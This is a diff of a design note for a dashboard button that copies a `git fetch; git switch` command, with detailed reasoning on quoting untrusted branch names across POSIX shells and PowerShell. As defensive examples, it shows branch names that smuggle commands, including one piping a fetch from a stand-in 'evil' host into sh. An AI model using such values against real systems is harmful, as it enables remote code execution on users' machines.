@@ -8,7 +8,9 @@ Reviewed with the user: the placement (icons after the title, then moved
 after the open tasks on 2026-10-28), the keys (`c`, `b`), the module
 (option A below) and, after the implementation, `git switch` in place of
 `git checkout` (2026-10-28), then a third action, the branch opened in
-Sourcetree (2026-10-28, §3.5). The rest is *Decided*.
+Sourcetree (2026-10-28, §3.5), then a fetch before the switch, the
+command pasted in PowerShell, Git Bash and the common Unix shells alike
+(2026-10-28, §3.1). The rest is *Decided*.
 
 ## 1. Problem
 
@@ -28,16 +30,45 @@ copying the branch name.
 ### 3.1 What is copied
 
 - **Branch name**: `source.branch.name` as it is.
-- **Switch command**: `git switch <branch>`, from a pure
-  `switchCommand(branch)`. *Decided*: a branch name is untrusted text
-  that ends up in a shell. Git allows `$`, `;`, `|`, `&`, `` ` ``, `(`,
-  `)`, `<`, `>`, `!`, `#`, `{`, `}` and both quotes in a branch name, so
-  anyone who can push may name a branch ``x;curl${IFS}evil|sh``, and
-  pasting the command would run it. A name made only of letters, digits
-  and `. _ / - + @ = , %` is left bare (`git switch feature/ABC-1-export`);
-  any other is put in single quotes, each `'` in it written `'\''`
-  (`git switch 'x;curl${IFS}evil|sh'`). Git forbids spaces, control
-  characters and `~ ^ : ? * [ \` in a branch name.
+- **Switch command**: `git fetch origin '<branch>'; git switch
+  '<branch>'`, from a pure `switchCommand(branch)`, so that a branch
+  pushed after the last fetch opens too. The user pastes it in bash,
+  zsh, sh, fish, Git Bash, Windows PowerShell 5.1 or PowerShell 7.
+  *Decided*:
+  - **`;`, not `&&`**: PowerShell has `&&` from 7 only
+    (about_Pipeline_Chain_Operators); 5.1 rejects the line. After a
+    failed fetch the switch runs anyway and does what a switch alone
+    does: it opens a branch fetched before, or fails ("invalid
+    reference"). Every failure leaves the repository as it was.
+  - **`origin`**: the dashboard cannot know the remote's name; `origin`
+    is git's default and the user's. Another name: the fetch fails, the
+    switch runs as above. A `--single-branch` clone fetches the branch
+    but cannot guess it (its refspec maps the default branch only).
+  - **The name always in single quotes**: a branch name is untrusted
+    text bound for a shell. Git allows `$`, `;`, `|`, `&`, `` ` ``, `(`,
+    `)`, `<`, `>`, `!`, `#`, `{`, `}` and both quotes in it, so anyone
+    who can push may name a branch ``x;curl${IFS}evil|sh``. A
+    single-quoted word is literal in every one of those shells, and
+    PowerShell reads a bare word too much (about_Parsing): `$` anywhere,
+    `@` and `#` at its start, `--%`, a number-like word (`1.10`) as a
+    number. Git forbids spaces, control characters and `~ ^ : ? * [ \`
+    in a branch name, and fish's escapes inside single quotes are `\'`
+    and `\\` only.
+  - **No command for a name no quoting carries everywhere**: a `'` is
+    written `'\''` in a POSIX shell and `''` in PowerShell, which also
+    closes a single-quoted word on the typographic `‘ ’ ‚ ‛`
+    (about_Quoting_Rules: `x’;calc;’` would run calc); Windows
+    PowerShell 5.1 drops a `"` passed to a native command (fixed in 7.3);
+    Git Bash turns an argument `x=/y` into a Windows path (MSYS2), and
+    `=/` is the one path-like shape a branch name can take (no leading
+    `/`, no `:`). A name holding `'`, `"`, `‘ ’ ‚ ‛ “ ” „` or `=/` gets no
+    command button; its name and its Sourcetree link stay, and `c` does
+    nothing on its row.
+  - Checked by pasting the commands in bash, zsh and dash on branches
+    pushed after the clone (`$HOME`, `@args`, `#x`, `1.10`, `a,b`, a
+    backtick and `;` payloads): each fetched and opened, nothing ran.
+    PowerShell and fish are not installed here: their part rests on
+    Microsoft's documentation and fish's quoting rules.
 - **Read by git as a branch only**: the review of the branch found that
   `git checkout docs`, with a branch `docs` not fetched yet, restores the
   folder `docs/` from the index, losing its changes. The command first
@@ -187,8 +218,16 @@ checks it.
   tooltip shows the exact text copied.
 - **Icons hidden until hover**: invisible to the keyboard and to a first
   look; muted is enough.
-- **`git fetch && git switch`**: git's DWIM creates the tracking branch
-  from a fetched remote branch; a fetch is the user's call.
+- **`git fetch origin <branch> && git switch <branch>`**: the switch
+  after a fetch only, but PowerShell 5.1 has no `&&`.
+- **`git fetch && git switch`** (every branch of the current branch's
+  remote, whatever its name): slow the first time on a large repository.
+- **An explicit refspec** (`+refs/heads/<b>:refs/remotes/origin/<b>`) for
+  `--single-branch` clones: `git switch` still cannot guess the branch
+  (checked).
+- **A name left bare when plainly safe**, quoted `'\''`-style otherwise
+  (the first implementation): wrong in PowerShell, where a bare word is
+  read further and `'\''` is no escape.
 - **`git checkout <branch> --`** (the first implementation): as safe, but
   the trailing `--` puzzles; `git switch` (git 2.23) needs none.
 - **`document.execCommand('copy')` fallback** over plain http: deprecated;
